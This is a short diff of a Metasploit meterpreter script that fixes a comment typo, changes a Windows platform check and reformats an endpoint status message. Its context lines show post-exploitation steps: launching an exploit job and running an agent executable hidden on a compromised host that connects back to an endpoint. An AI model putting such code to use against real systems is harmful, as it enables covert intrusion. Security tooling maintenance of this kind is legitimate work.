@@ -1,6 +1,6 @@
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
-# If you'd like to imporve this script, please try to port it as a post
+# If you'd like to improve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
@@ -84,7 +84,7 @@ mul.exploit_simple(
   'RunAsJob' => true
 )
 
-if client.platform =~ /win32|win64/
+if client.platform == 'windows'
   server = client.sys.process.open
 
   print_status("Current server process: #{server.name} (#{server.pid})")
@@ -108,7 +108,7 @@ if client.platform =~ /win32|win64/
     #
     # Execute the agent
     #
-    print_status("Executing the agent with endpoint #{rhost}:#{rport}...")
+    print_status("Executing the agent with endpoint #{Rex::Socket.to_authority(rhost, rport)}...")
     pid = session.sys.process.execute(tempexe, nil, {'Hidden' => true})
   elsif ! spawn
     # Get the target process name
